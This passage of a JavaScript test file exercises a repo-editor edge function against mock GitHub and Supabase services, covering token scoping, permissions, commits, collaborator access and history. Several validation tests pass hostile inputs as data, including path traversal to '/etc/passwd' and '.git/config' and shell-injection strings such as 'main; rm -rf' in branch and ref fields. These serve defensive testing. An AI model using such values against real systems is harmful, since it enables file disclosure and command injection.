// Test for repo-editor. No database and no network are needed: a pretend Supabase and a pretend GitHub
// answer in memory. The pretend GitHub checks what the real one would: the app's signature on its
// identity token, that a token is limited to one repository, that writing needs the "write" permission,
// and that a branch cannot be moved sideways.
//
//   node --experimental-strip-types supabase/functions/repo-editor/editor.test.mjs

import assert from 'node:assert/strict'
import { createHash, createPublicKey, createVerify, generateKeyPairSync } from 'node:crypto'
import { appJwt, cleanPath, handler, pkcs1ToPkcs8 } from './index.ts'

const SERVICE_KEY = 'test-service-key-0123456789'
const U = { awa: 'e1000000-0000-0000-0000-000000000001', cara: 'e1000000-0000-0000-0000-000000000002', nolink: 'e1000000-0000-0000-0000-000000000003' }
const P_AWA = 'e2000000-0000-0000-0000-000000000001'
const P_BOB = 'e2000000-0000-0000-0000-000000000002'
// awa owns the project 'appli'; the member 'nolink' (no GitHub account) collaborates on it
const PROJECTS = { [P_AWA]: { owner: 'awa', repo: 'appli', members: [U.awa, U.nolink] }, [P_BOB]: { owner: 'bob', repo: 'secret', members: [] } }
const TOKENS = { 't-awa': U.awa, 't-cara': U.cara, 't-nolink': U.nolink }
const USERNAMES = { [U.awa]: 'awa_dev', [U.cara]: 'cara', [U.nolink]: 'ndeye_k' }
const GITHUB_NAMES = { [U.awa]: 'awa', [U.cara]: 'cara', [U.nolink]: null }

const pkcs1 = generateKeyPairSync('rsa', { modulusLength: 2048, privateKeyEncoding: { type: 'pkcs1', format: 'pem' }, publicKeyEncoding: { type: 'spki', format: 'pem' } })
const pkcs8 = generateKeyPairSync('rsa', { modulusLength: 2048, privateKeyEncoding: { type: 'pkcs8', format: 'pem' }, publicKeyEncoding: { type: 'spki', format: 'pem' } })

const sha = (s) => createHash('sha1').update(s).digest('hex')

// ---- The pretend GitHub ---------------------------------------------------------------------------------------
let gh
let adopted = []
let presence = []
let adoptError = null
let notified = []
function resetGithub(publicKey) {
  gh = {
    publicKey,
    calls: [],
    down: false,
    installations: [
      { id: 77, account: { login: 'awa', type: 'User' }, repos: ['appli', 'vide'] },
      { id: 88, account: { login: 'bob', type: 'User' }, repos: ['secret'] },
      { id: 99, account: { login: 'jaajef-org', type: 'Organization' }, repos: ['orgrepo'] },
    ],
    tokens: new Map(),
    repos: {
      'awa/appli': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
      'awa/vide': { default_branch: 'main', private: false, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
      'bob/secret': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
    },
    moveBeforeRefUpdate: false,
    pullsGranted: true,
  }
  const repo = gh.repos['awa/appli']
  repo.files = { 'main.py': 'print("héllo")\n', 'src/util.py': 'x = 1\n', 'old.txt': 'delete me\n' }
  commitFiles(repo, repo.files, null, 'first')
  const secret = gh.repos['bob/secret']
  secret.files = { 'plan.txt': 'top secret\n' }
  commitFiles(secret, secret.files, null, 'first')
}
function commitFiles(repo, files, parent, message) {
  const treeSha = sha(JSON.stringify(files) + message)
  repo.trees.set(treeSha, { ...files })
  const commitSha = sha(`${treeSha}${parent}${message}`)
  repo.commits.set(commitSha, { tree: treeSha, parents: parent ? [parent] : [], message })
  repo.head = commitSha
  repo.files = { ...files }
  return commitSha
}

/** A commit that is not on the default branch (used to set up a side branch). */
function commitSide(repo, files, parent, message) {
  const treeSha = sha(JSON.stringify(files) + message)
  repo.trees.set(treeSha, { ...files })
  const commitSha = sha(`${treeSha}${parent}${message}`)
  repo.commits.set(commitSha, { tree: treeSha, parents: [parent], message })
  return commitSha
}

function jsonRes(status, body) {
  return new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
}

async function pretendGithub(url, init) {
  const path = url.pathname + url.search
  const method = init.method ?? 'GET'
  const auth = (init.headers.authorization ?? '').replace('Bearer ', '')
  const body = init.body ? JSON.parse(init.body) : undefined
  gh.calls.push({ method, path, body, auth })
  if (gh.down) throw new Error('network down')

  if (path.startsWith('/app/')) {
    const [h, c, s] = auth.split('.')
    if (!s) return jsonRes(401, { message: 'bad jwt' })
    const verify = createVerify('RSA-SHA256')
    verify.update(`${h}.${c}`)
    if (!verify.verify(createPublicKey(gh.publicKey), Buffer.from(s, 'base64url'))) return jsonRes(401, { message: 'bad signature' })
    const claims = JSON.parse(Buffer.from(c, 'base64url').toString())
    if (claims.iss !== '12345' || claims.exp - claims.iat > 660) return jsonRes(401, { message: 'bad claims' })
    if (method === 'GET' && path.startsWith('/app/installations?')) {
      return jsonRes(200, gh.installations.map((i) => ({ id: i.id, account: i.account })))
    }
    const m = path.match(/^\/app\/installations\/(\d+)\/access_tokens$/)
    if (m && method === 'POST') {
      const inst = gh.installations.find((i) => i.id === Number(m[1]))
      if (!inst) return jsonRes(404, { message: 'not found' })
      for (const r of body.repositories ?? []) if (!inst.repos.includes(r)) return jsonRes(422, { message: 'repo not in installation' })
      if (body.permissions?.pull_requests && !gh.pullsGranted) return jsonRes(422, { message: 'The permissions requested are not granted to this installation.' })
      const token = `ghs_${gh.tokens.size}`
      gh.tokens.set(token, { installation: inst, repositories: body.repositories ?? inst.repos, permissions: body.permissions })
      return jsonRes(201, { token })
    }
    return jsonRes(404, { message: 'unknown app path' })
  }

  const grant = gh.tokens.get(auth)
  if (!grant) return jsonRes(401, { message: 'bad credentials' })
  if (path.startsWith('/installation/repositories')) {
    return jsonRes(200, { repositories: grant.repositories.map((r) => ({ name: r, private: true, default_branch: 'main', owner: { login: grant.installation.account.login } })) })
  }
  const m = path.match(/^\/repos\/([^/]+)\/([^/?]+)(\/[^?]*)?(\?.*)?$/)
  if (!m) return jsonRes(404, { message: 'unknown path' })
  const [, owner, name, rest = ''] = m
  if (owner.toLowerCase() !== grant.installation.account.login.toLowerCase() || !grant.repositories.includes(name)) return jsonRes(404, { message: 'Not Found' })
  const repo = gh.repos[`${owner}/${name}`]
  if (!repo) return jsonRes(404, { message: 'Not Found' })
  let r0
  const writing = method !== 'GET'
  const isPulls = rest === '/pulls' || rest.startsWith('/pulls/')
  if (isPulls && !grant.permissions?.pull_requests) return jsonRes(403, { message: 'Resource not accessible by integration' })
  if (writing && isPulls && grant.permissions?.pull_requests !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
  if (writing && !isPulls && grant.permissions?.contents !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
  if (isPulls && method === 'PUT' && grant.permissions?.contents !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })

  if (rest === '/pulls' && method === 'GET') {
    const q = new URL(`http://x${path}`).searchParams
    gh.pullsQuery = q
    let list = repo.pulls.filter((p) => p.state === (q.get('state') ?? 'open'))
    if (q.get('base')) list = list.filter((p) => p.base.ref === q.get('base'))
    if (q.get('head')) list = list.filter((p) => `${owner}:${p.head.ref}` === q.get('head'))
    return jsonRes(200, list)
  }
  if (rest === '/pulls' && method === 'POST') {
    const side = repo.branches[body.head]
    if (!side) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: 'Head ref must be a branch' }] })
    if (repo.pulls.some((p) => p.state === 'open' && p.head.ref === body.head)) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: `A pull request already exists for ${owner}:${body.head}.` }] })
    if (side === repo.head) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: `No commits between ${body.base} and ${body.head}` }] })
    const pr = { number: repo.pulls.length + 1, title: body.title, body: body.body, state: 'open', head: { ref: body.head, sha: side, repo: { full_name: `${owner}/${name}` } }, base: { ref: body.base }, user: { login: 'jaajef-tech-editor[bot]' }, html_url: `https://github.com/${owner}/${name}/pull/${repo.pulls.length + 1}`, created_at: '2026-11-08T10:00:00Z' }
    repo.pulls.push(pr)
    return jsonRes(201, pr)
  }
  r0 = rest.match(/^\/pulls\/(\d+)(\/merge)?$/)
  if (r0) {
    const pr = repo.pulls.find((p) => p.number === Number(r0[1]))
    if (!pr) return jsonRes(404, { message: 'Not Found' })
    if (method === 'GET') return jsonRes(200, pr)
    if (method === 'PUT' && r0[2]) {
      if (pr.conflict) return jsonRes(405, { message: 'Pull Request is not mergeable' })
      if (body.sha !== repo.branches[pr.head.ref]) return jsonRes(409, { message: 'Head branch was modified' })
      pr.state = 'closed'
      pr.merged = true
      gh.merged = { number: pr.number, method: body.merge_method }
      repo.head = repo.branches[pr.head.ref]
      repo.files = { ...repo.trees.get(repo.commits.get(repo.head).tree) }
      return jsonRes(200, { merged: true })
    }
    if (method === 'PATCH') { pr.state = body.state; return jsonRes(200, pr) }
  }
  if (rest === '/commits' && method === 'GET') {
    gh.historyQuery = new URL(`http://x${path}`).searchParams
    const list = []
    let cursor = repo.head
    while (cursor && list.length < 30) {
      const c = repo.commits.get(cursor)
      list.push({ sha: cursor, commit: { message: `${c.message}\n\nlong body`, author: { name: 'Awa', date: '2026-11-08T10:00:00Z' } }, html_url: `https://github.com/${owner}/${name}/commit/${cursor}` })
      cursor = c.parents[0] ?? null
    }
    return jsonRes(200, list)
  }
  if (rest === '' && method === 'GET') return jsonRes(200, { name, default_branch: repo.default_branch, private: repo.private, description: repo.description ?? null, language: repo.language ?? null, owner: { login: owner } })
  if (rest === '/branches' && method === 'GET') {
    return jsonRes(200, [{ name: repo.default_branch }, ...Object.keys(repo.branches).map((name) => ({ name }))])
  }
  if (rest === '/git/refs' && method === 'POST') {
    const name = body.ref.replace('refs/heads/', '')
    if (name === repo.default_branch || repo.branches[name]) return jsonRes(422, { message: 'Reference already exists' })
    repo.branches[name] = body.sha
    return jsonRes(201, { ref: body.ref, object: { sha: body.sha } })
  }
  let r = rest.match(/^\/git\/ref\/heads\/(.+)$/)
  if (r && method === 'GET') {
    const name = decodeURIComponent(r[1])
    if (repo.branches[name]) return jsonRes(200, { object: { sha: repo.branches[name] } })
    if (!repo.head || name !== repo.default_branch) return jsonRes(repo.head ? 404 : 409, { message: 'Git Repository is empty.' })
    return jsonRes(200, { object: { sha: repo.head } })
  }
  r = rest.match(/^\/git\/trees\/([0-9a-f]+)$/)
  if (r && method === 'GET') {
    const commit = repo.commits.get(r[1])
    const files = commit ? repo.trees.get(commit.tree) : null
    if (!files) return jsonRes(404, { message: 'not found' })
    const tree = []
    for (const [p, c] of Object.entries(files)) tree.push({ path: p, type: 'blob', size: c.length })
    return jsonRes(200, { tree: [{ path: 'src', type: 'tree' }, ...tree], truncated: false })
  }
  r = rest.match(/^\/git\/commits\/([0-9a-f]+)$/)
  if (r && method === 'GET') {
    const commit = repo.commits.get(r[1])
    return commit ? jsonRes(200, { tree: { sha: commit.tree } }) : jsonRes(404, { message: 'not found' })
  }
  r = rest.match(/^\/contents\/(.+?)$/)
  if (r && method === 'GET') {
    const p = decodeURIComponent(r[1].split('?')[0])
    const text = repo.files[p]
    if (text === undefined) return jsonRes(404, { message: 'Not Found' })
    return jsonRes(200, { type: 'file', encoding: 'base64', size: Buffer.byteLength(text), content: Buffer.from(text).toString('base64') })
  }
  if (rest === '/git/blobs' && method === 'POST') {
    const id = sha(body.content)
    repo.blobs.set(id, body.content)
    return jsonRes(201, { sha: id })
  }
  if (rest === '/git/trees' && method === 'POST') {
    const base = repo.trees.get(body.base_tree)
    const files = { ...base }
    for (const e of body.tree) {
      if (e.sha === null) delete files[e.path]
      else files[e.path] = repo.blobs.get(e.sha)
    }
    const id = sha(JSON.stringify(files))
    repo.trees.set(id, files)
    return jsonRes(201, { sha: id })
  }
  if (rest === '/git/commits' && method === 'POST') {
    const id = sha(`${body.tree}${body.parents}${body.message}`)
    repo.commits.set(id, { tree: body.tree, parents: body.parents, message: body.message })
    return jsonRes(201, { sha: id })
  }
  r = rest.match(/^\/git\/refs\/heads\/(.+)$/)
  if (r && method === 'PATCH' && repo.branches[decodeURIComponent(r[1])]) {
    const name = decodeURIComponent(r[1])
    const commit = repo.commits.get(body.sha)
    if (!commit || commit.parents[0] !== repo.branches[name]) return jsonRes(422, { message: 'Update is not a fast forward' })
    repo.branches[name] = body.sha
    return jsonRes(200, { object: { sha: body.sha } })
  }
  if (r && method === 'PATCH') {
    if (gh.moveBeforeRefUpdate) {
      commitFiles(repo, { ...repo.files, 'someone-else.txt': 'x' }, repo.head, 'pushed by someone else')
    }
    const commit = repo.commits.get(body.sha)
    if (!commit || commit.parents[0] !== repo.head) return jsonRes(422, { message: 'Update is not a fast forward' })
    repo.head = body.sha
    repo.files = { ...repo.trees.get(commit.tree) }
    return jsonRes(200, { object: { sha: body.sha } })
  }
  return jsonRes(404, { message: 'unknown repo path' })
}

// ---- The pretend Supabase ----------------------------------------------------------------------------------------
async function pretendFetch(input, init = {}) {
  const url = new URL(typeof input === 'string' ? input : input.url)
  if (url.host === 'gh.test') return pretendGithub(url, { ...init, headers: init.headers ?? {} })
  if (url.host === 'supa.test') {
    if (url.pathname === '/auth/v1/user') {
      const id = TOKENS[(init.headers?.authorization ?? '').replace('Bearer ', '')]
      return id ? jsonRes(200, { id }) : jsonRes(401, { message: 'bad token' })
    }
    if (url.pathname === '/rest/v1/rpc/project_for_member') {
      if (init.headers?.apikey !== SERVICE_KEY) return jsonRes(401, {})
      const args = JSON.parse(init.body)
      const project = PROJECTS[args.p_project]
      const ok = project && project.members.includes(args.p_user)
      return jsonRes(200, ok ? [{ github_owner: project.owner, github_repo: project.repo, is_owner: args.p_user === U.awa }] : [])
    }
    if (url.pathname === '/rest/v1/rpc/notify_proposal') {
      if (init.headers?.apikey !== SERVICE_KEY) return jsonRes(401, {})
      notified.push(JSON.parse(init.body))
      return new Response(null, { status: 204 })
    }
    if (url.pathname === '/rest/v1/rpc/sync_private_presence') {
      if (init.headers?.apikey !== SERVICE_KEY) return jsonRes(401, {})
      presence.push(JSON.parse(init.body))
      return new Response(null, { status: 204 })
    }
    if (url.pathname === '/rest/v1/rpc/adopt_private_project') {
      if (init.headers?.apikey !== SERVICE_KEY) return jsonRes(401, {})
      const args = JSON.parse(init.body)
      adopted.push(args)
      if (adoptError) return jsonRes(400, { message: adoptError })
      return jsonRes(200, 'p-1')
    }
    if (url.pathname === '/rest/v1/profiles') {
      if (init.headers?.apikey !== SERVICE_KEY) return jsonRes(401, {})
      const id = url.searchParams.get('id').replace('eq.', '')
      if (url.searchParams.get('select') === 'username') return jsonRes(200, id in USERNAMES ? [{ username: USERNAMES[id] }] : [])
      return jsonRes(200, id in GITHUB_NAMES ? [{ github_username: GITHUB_NAMES[id] }] : [])
    }
  }
  throw new Error(`unexpected call to ${url}`)
}

// ---- Helpers --------------------------------------------------------------------------------------------------------
function envFor(privateKey) {
  const values = {
    SUPABASE_URL: 'http://supa.test', SUPABASE_SERVICE_ROLE_KEY: SERVICE_KEY, GITHUB_APP_ID: '12345', GITHUB_APP_SLUG: 'jaajef-tech-editor',
    GITHUB_APP_PRIVATE_KEY: privateKey, GITHUB_API_URL: 'http://gh.test',
  }
  return (name) => values[name]
}
let getEnv = envFor(pkcs1.privateKey)
async function call(token, body, { method = 'POST', env = getEnv } = {}) {
  const request = new Request('http://fn.test/', {
    method,
    headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: method === 'POST' ? JSON.stringify(body) : undefined,
  })
  const response = await handler(request, env, pretendFetch)
  let json = null
  try { json = await response.json() } catch { json = null }
  return { status: response.status, json }
}
const githubCallsMade = () => gh.calls.length
const headOfAwa = () => gh.repos['awa/appli'].head

// ---- Tests ----------------------------------------------------------------------------------------------------------
let n = 0
async function test(name, fn) {
  resetGithub(pkcs1.publicKey)
  adopted = []
  presence = []
  adoptError = null
  notified = []
  getEnv = envFor(pkcs1.privateKey)
  await fn()
  n += 1
  console.log(`OK ${n}: ${name}`)
}

await test('the app identity token is signed correctly, with a key in either file format', async () => {
  for (const [key, label] of [[pkcs1, 'pkcs1'], [pkcs8, 'pkcs8']]) {
    resetGithub(key.publicKey)
    getEnv = envFor(key.privateKey)
    const r = await call('t-awa', { action: 'status' })
    assert.equal(r.status, 200, label)
    assert.equal(r.json.installed, true, label)
  }
  // a key pasted with literal \n (as some secret boxes store it) also works
  getEnv = envFor(pkcs1.privateKey.replace(/\n/g, '\\n'))
  resetGithub(pkcs1.publicKey)
  assert.equal((await call('t-awa', { action: 'status' })).json.installed, true)
  // a different key is refused by the pretend GitHub
  getEnv = envFor(pkcs8.privateKey)
  resetGithub(pkcs1.publicKey)
  assert.equal((await call('t-awa', { action: 'status' })).status, 502)
  assert.equal(pkcs1ToPkcs8(new Uint8Array([1, 2, 3]))[0], 0x30)
  const jwt = await appJwt({ appId: '12345', privateKey: pkcs1.privateKey }, 1000)
  assert.equal(jwt.split('.').length, 3)
})

await test('only POST, only signed-in members, and only when configured', async () => {
  assert.equal((await call(null, { action: 'status' }, { method: 'OPTIONS' })).status, 204)
  assert.equal((await call('t-awa', {}, { method: 'GET' })).status, 405)
  assert.equal((await call(null, { action: 'status' })).status, 401)
  assert.equal((await call('wrong', { action: 'status' })).status, 401)
  const noKey = (name) => (name === 'GITHUB_APP_PRIVATE_KEY' ? '' : getEnv(name))
  assert.equal((await call('t-awa', { action: 'status' }, { env: noKey })).status, 503)
  assert.equal(githubCallsMade(), 0)
})

await test('a member with no linked GitHub account gets a clear answer and GitHub is not called', async () => {
  const r = await call('t-nolink', { action: 'repos' })
  assert.deepEqual([r.status, r.json.error], [409, 'github_not_linked'])
  assert.equal(githubCallsMade(), 0)
})

await test('status: installed or not, with the install address', async () => {
  const yes = await call('t-awa', { action: 'status' })
  assert.deepEqual(yes.json, { installed: true, install_url: 'https://github.com/apps/jaajef-tech-editor/installations/new', github_name: 'awa' })
  const no = await call('t-cara', { action: 'status' })
  assert.equal(no.json.installed, false)
  const refused = await call('t-cara', { action: 'repos' })
  assert.deepEqual([refused.status, refused.json.error], [409, 'not_installed'])
})

await test('repos: only the member\'s own, from their own installation', async () => {
  const r = await call('t-awa', { action: 'repos' })
  assert.deepEqual(r.json.repos.map((x) => x.name).sort(), ['appli', 'vide'])
  // the token for listing is read-only
  const minted = [...gh.tokens.values()]
  assert.ok(minted.every((t) => t.permissions.contents === 'read'))
})

await test('tree: files of an allowed repository, and an empty repository', async () => {
  const r = await call('t-awa', { action: 'tree', repo: 'appli' })
  assert.equal(r.status, 200)
  assert.equal(r.json.branch, 'main')
  assert.equal(r.json.head, headOfAwa())
  assert.deepEqual(r.json.entries.filter((e) => e.type === 'blob').map((e) => e.path).sort(), ['main.py', 'old.txt', 'src/util.py'])
  const empty = await call('t-awa', { action: 'tree', repo: 'vide' })
  assert.deepEqual([empty.status, empty.json.entries, empty.json.head], [200, [], null])
})

await test('a member cannot reach another member\'s repository, even by name or by a made-up owner', async () => {
  const other = await call('t-awa', { action: 'tree', repo: 'secret' })
  assert.deepEqual([other.status, other.json.error], [403, 'repo_not_allowed'])
  const sneaky = await call('t-awa', { action: 'file', repo: 'secret', owner: 'bob', path: 'plan.txt', ref: 'main' })
  assert.equal(sneaky.status, 403)
  const org = await call('t-awa', { action: 'tree', repo: 'orgrepo', owner: 'jaajef-org' })
  assert.equal(org.status, 403)
  assert.ok(gh.calls.every((c) => !c.path.includes('/repos/bob/')))
  const text = await call('t-awa', { action: 'commit', repo: 'secret', branch: 'main', base_sha: headOfAwa(), message: 'x', files: [{ path: 'a', content: 'b' }] })
  assert.equal(text.status, 403)
  assert.equal(gh.repos['bob/secret'].files['a'], undefined)
})

await test('each GitHub token is limited to one repository', async () => {
  await call('t-awa', { action: 'tree', repo: 'appli' })
  const tokens = [...gh.tokens.values()]
  assert.ok(tokens.length > 0 && tokens.every((t) => t.repositories.length === 1 && t.repositories[0] === 'appli'))
})

await test('file: reads text (with accents) and refuses odd paths without calling GitHub', async () => {
  const r = await call('t-awa', { action: 'file', repo: 'appli', path: 'main.py', ref: 'main' })
  assert.deepEqual(r.json, { path: 'main.py', content: 'print("héllo")\n' })
  assert.equal((await call('t-awa', { action: 'file', repo: 'appli', path: 'nope.py', ref: 'main' })).status, 404)
  gh.calls.length = 0
  for (const path of ['../x', 'a/../b', '/etc/passwd', '.git/config', 'a/.git/x', 'a//b', '', 'a\\b']) {
    const bad = await call('t-awa', { action: 'file', repo: 'appli', path, ref: 'main' })
    assert.equal(bad.status, 400, path)
  }
  assert.equal(githubCallsMade(), 0)
  assert.equal(cleanPath('src/ok.py'), 'src/ok.py')
})

await test('commit: one commit with changed, new and deleted files, a write token, and the footer', async () => {
  const before = headOfAwa()
  const r = await call('t-awa', {
    action: 'commit', repo: 'appli', branch: 'main', base_sha: before, message: 'Mon changement',
    files: [{ path: 'main.py', content: 'print("v2")\n' }, { path: 'new/dir/file.txt', content: 'bonjour' }, { path: 'old.txt', delete: true }],
  })
  assert.equal(r.status, 200, JSON.stringify(r.json))
  const repo = gh.repos['awa/appli']
  assert.equal(repo.head, r.json.commit_sha)
  assert.notEqual(repo.head, before)
  assert.deepEqual(Object.keys(repo.files).sort(), ['main.py', 'new/dir/file.txt', 'src/util.py'])
  assert.equal(repo.files['main.py'], 'print("v2")\n')
  const commit = repo.commits.get(repo.head)
  assert.deepEqual(commit.parents, [before])
  assert.equal(commit.message, 'Mon changement\n\nSaved from jaajef.tech by @awa')
  assert.equal(r.json.html_url, `https://github.com/awa/appli/commit/${r.json.commit_sha}`)
  const writeToken = [...gh.tokens.values()].at(-1)
  assert.deepEqual([writeToken.permissions.contents, writeToken.repositories], ['write', ['appli']])
})

await test('commit is refused, and nothing changes, if the branch moved since the editor loaded it', async () => {
  const stale = headOfAwa()
  commitFiles(gh.repos['awa/appli'], { ...gh.repos['awa/appli'].files, 'other.txt': '1' }, stale, 'pushed from elsewhere')
  const moved = headOfAwa()
  const r = await call('t-awa', { action: 'commit', repo: 'appli', branch: 'main', base_sha: stale, message: 'mine', files: [{ path: 'main.py', content: 'mine' }] })
  assert.deepEqual([r.status, r.json.error], [409, 'branch_moved'])
  assert.equal(headOfAwa(), moved)
  assert.equal(gh.repos['awa/appli'].files['main.py'], 'print("héllo")\n')
})

await test('commit is refused if someone pushes during the save', async () => {
  gh.moveBeforeRefUpdate = true
  const r = await call('t-awa', { action: 'commit', repo: 'appli', branch: 'main', base_sha: headOfAwa(), message: 'mine', files: [{ path: 'main.py', content: 'mine' }] })
  assert.deepEqual([r.status, r.json.error], [409, 'branch_moved'])
  assert.notEqual(gh.repos['awa/appli'].files['main.py'], 'mine')
})

await test('commit: bad requests are refused before GitHub is called', async () => {
  const base = headOfAwa()
  const ok = { action: 'commit', repo: 'appli', branch: 'main', base_sha: base, message: 'm', files: [{ path: 'a.txt', content: 'x' }] }
  const bads = {
    'no message': { ...ok, message: '   ' },
    'long message': { ...ok, message: 'x'.repeat(501) },
    'no files': { ...ok, files: [] },
    'too many files': { ...ok, files: Array.from({ length: 21 }, (_, i) => ({ path: `f${i}.txt`, content: 'x' })) },
    'same path twice': { ...ok, files: [{ path: 'a', content: '1' }, { path: 'a', content: '2' }] },
    'git folder': { ...ok, files: [{ path: '.git/config', content: 'x' }] },
    'parent path': { ...ok, files: [{ path: '../x', content: 'x' }] },
    'huge file': { ...ok, files: [{ path: 'a', content: 'x'.repeat(1_000_001) }] },
    'huge total': { ...ok, files: [1, 2, 3, 4].map((i) => ({ path: `f${i}`, content: 'x'.repeat(900_000) })) },
    'no content': { ...ok, files: [{ path: 'a' }] },
    'odd branch': { ...ok, branch: 'main; rm -rf' },
    'odd sha': { ...ok, base_sha: 'abc' },
    'odd repo': { ...ok, repo: '../x' },
    'unknown action': { ...ok, action: 'delete_repo' },
  }
  for (const [name, body] of Object.entries(bads)) assert.equal((await call('t-awa', body)).status, name === 'odd repo' ? 400 : 400, name)
  assert.equal(githubCallsMade(), 0)
  assert.equal(headOfAwa(), base)
})

await test('adopt: a private repository is listed for its owner, with the owner and repository from GitHub, never from the request', async () => {
  gh.repos['awa/appli'].description = 'Mon appli'
  gh.repos['awa/appli'].language = 'Python'
  const r = await call('t-awa', { action: 'adopt', repo: 'appli', title: 'Appli', owner: 'bob', p_owner: 'x' })
  assert.deepEqual([r.status, r.json.project_id], [200, 'p-1'])
  assert.deepEqual(adopted, [{ p_owner: U.awa, p_repo: 'appli', p_title: 'Appli', p_summary: 'Mon appli', p_language: 'Python' }])
  // the token used to look at the repository is read-only and limited to that repository
  const minted = [...gh.tokens.values()]
  assert.ok(minted.every((t) => t.permissions.contents === 'read'))
})

await test('adopt: refusals', async () => {
  // a public repository goes through the normal list
  assert.deepEqual((await call('t-awa', { action: 'adopt', repo: 'vide' })).json, { error: 'repo_is_public' })
  // app not installed on that repository / account
  assert.equal((await call('t-awa', { action: 'adopt', repo: 'secret' })).status, 403)
  assert.deepEqual((await call('t-cara', { action: 'adopt', repo: 'appli' })).json, { error: 'not_installed' })
  // someone else's installation is never used
  assert.equal((await call('t-awa', { action: 'adopt', repo: 'secret' })).status, 403)
  // bad input
  assert.equal((await call('t-awa', { action: 'adopt', repo: '../x' })).status, 400)
  assert.equal((await call('t-awa', { action: 'adopt' })).status, 400)
  assert.equal(adopted.length, 0)
  // database answers
  adoptError = 'This repository is already listed'
  assert.deepEqual((await call('t-awa', { action: 'adopt', repo: 'appli' })).json, { error: 'already_listed' })
  adoptError = 'You have reached the limit of projects you can list'
  assert.deepEqual((await call('t-awa', { action: 'adopt', repo: 'appli' })).json, { error: 'limit_reached' })
  adoptError = 'boom'
  assert.equal((await call('t-awa', { action: 'adopt', repo: 'appli' })).status, 502)
})

await test('presence: tells the database which repositories the app can still see, for this member only', async () => {
  const r = await call('t-awa', { action: 'presence', owner: 'bob', p_owner: 'x', p_present: ['x'] })
  assert.deepEqual(r.json, { checked: true })
  assert.deepEqual(presence, [{ p_owner: U.awa, p_present: ['appli', 'vide'] }])
  assert.ok([...gh.tokens.values()].every((t) => t.permissions.contents === 'read'))
})

await test('presence: an uninstalled app or a full page of repositories flags nothing', async () => {
  assert.deepEqual((await call('t-cara', { action: 'presence' })).json, { checked: false })
  gh.installations[0].repos = Array.from({ length: 100 }, (_, i) => `r${i}`)
  assert.deepEqual((await call('t-awa', { action: 'presence' })).json, { checked: false })
  assert.equal(presence.length, 0)
})

await test('a collaborator with no GitHub account reads the code of a private project through the owner\'s installation', async () => {
  const tree = await call('t-nolink', { action: 'tree', project: P_AWA })
  assert.equal(tree.status, 200)
  assert.deepEqual(tree.json.entries.filter((e) => e.type === 'blob').map((e) => e.path).sort(), ['main.py', 'old.txt', 'src/util.py'])
  const file = await call('t-nolink', { action: 'file', project: P_AWA, path: 'main.py', ref: 'main' })
  assert.deepEqual(file.json, { path: 'main.py', content: 'print("héllo")\n' })
  // tokens are read-only and limited to that one repository, and made with the OWNER's installation
  const minted = [...gh.tokens.values()]
  assert.ok(minted.every((t) => t.permissions.contents === 'read' && t.installation.account.login === 'awa' && t.repositories.length === 1 && t.repositories[0] === 'appli'))
  // the owner too, with the same call
  assert.equal((await call('t-awa', { action: 'tree', project: P_AWA })).status, 200)
})

await test('reading by project is refused for everybody else', async () => {
  // not a member of that project
  assert.deepEqual([(await call('t-cara', { action: 'tree', project: P_AWA })).status, (await call('t-cara', { action: 'tree', project: P_AWA })).json.error], [403, 'repo_not_allowed'])
  // a project that does not exist
  assert.equal((await call('t-awa', { action: 'tree', project: 'e2000000-0000-0000-0000-0000000000ff' })).status, 403)
  // someone else's project, even for a member of another one
  assert.equal((await call('t-awa', { action: 'file', project: P_BOB, path: 'plan.txt', ref: 'main' })).status, 403)
  // a bad project id
  assert.equal((await call('t-awa', { action: 'tree', project: 'not-a-uuid' })).status, 400)
  assert.equal(githubCallsMade(), 0)
  // a collaborator can never write to the main code
  const base = headOfAwa()
  const c = await call('t-nolink', { action: 'commit', project: P_AWA, repo: 'appli', branch: 'main', base_sha: base, message: 'm', files: [{ path: 'a.txt', content: 'x' }] })
  assert.deepEqual([c.status, c.json.error], [403, 'branch_not_yours'])
  assert.equal(headOfAwa(), base)
  const a = await call('t-nolink', { action: 'adopt', project: P_AWA, repo: 'appli' })
  assert.equal(a.status, 409)
  assert.equal(adopted.length, 0)
})

await test('history: the latest commits, first line only, for the owner and a collaborator; bad input is refused', async () => {
  const r = await call('t-nolink', { action: 'history', project: P_AWA })
  assert.equal(r.status, 200)
  assert.deepEqual(r.json.commits.map((c) => [c.message, c.author]), [['first', 'Awa']])
  assert.equal(r.json.commits[0].html_url.startsWith('https://github.com/awa/appli/commit/'), true)
  assert.equal(r.json.more, false)
  const withPath = await call('t-awa', { action: 'history', project: P_AWA, path: 'src/util.py', ref: 'main', page: 2 })
  assert.equal(withPath.status, 200)
  assert.equal(gh.historyQuery.get('path'), 'src/util.py')
  assert.equal(gh.historyQuery.get('sha'), 'main')
  assert.equal(gh.historyQuery.get('page'), '2')
  // refused before GitHub is called
  const before = githubCallsMade()
  for (const bad of [{ path: '../x' }, { ref: 'a b; rm' }, { path: '.git/config' }]) {
    assert.equal((await call('t-awa', { action: 'history', project: P_AWA, ...bad })).status, 400, JSON.stringify(bad))
  }
  assert.equal(githubCallsMade(), before)
  assert.equal((await call('t-cara', { action: 'history', project: P_AWA })).status, 403)
  // without a project it works for the caller's own repositories
  assert.equal((await call('t-awa', { action: 'history', repo: 'appli' })).status, 200)
  assert.equal((await call('t-nolink', { action: 'history', repo: 'appli' })).status, 409)
})

await test('when GitHub is down the member gets a clear error, not a crash', async () => {
  gh.down = true
  const r = await call('t-awa', { action: 'tree', repo: 'appli' })
  assert.ok([500, 502].includes(r.status))
  assert.ok(r.json.error)
})

await test('branches: the owner and a collaborator list them, a stranger cannot, and the default one is named', async () => {
  gh.repos['awa/appli'].branches['ndeye_k/fix'] = headOfAwa()
  for (const who of ['t-awa', 't-nolink']) {
    const r = await call(who, { action: 'branches', project: P_AWA })
